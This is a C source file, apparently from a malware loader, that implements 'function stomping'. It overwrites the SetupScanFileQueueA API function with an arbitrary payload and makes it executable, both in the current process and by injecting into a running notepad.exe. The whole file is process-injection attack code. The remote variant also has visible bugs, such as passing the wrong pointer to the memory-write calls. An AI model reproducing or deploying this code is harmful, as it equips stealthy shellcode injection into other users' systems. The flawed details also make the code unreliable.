#include "payload_loading.h"
#include <setupapi.h>

#pragma comment (lib, "Setupapi.lib") // adding "setupapi.dll" to the import address table


BOOL WritePayloadViaFunctionStomping(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
    *pAddress = &SetupScanFileQueueA;
	DWORD	dwOldProtection = NULL;


	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(*pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL WritePayloadViaRemoteFunctionStomping(PVOID *pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {
	HANDLE		hProcess	= NULL;
    DWORD	dwOldProtection = NULL;
	DWORD		dwProcessId = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	DebugPrint("[i] Fucntion stomping into remote process notepad.exe");

	if (!GetRemoteProcessHandle("notepad.exe", &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);

	*pAddress = &SetupScanFileQueueA;

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
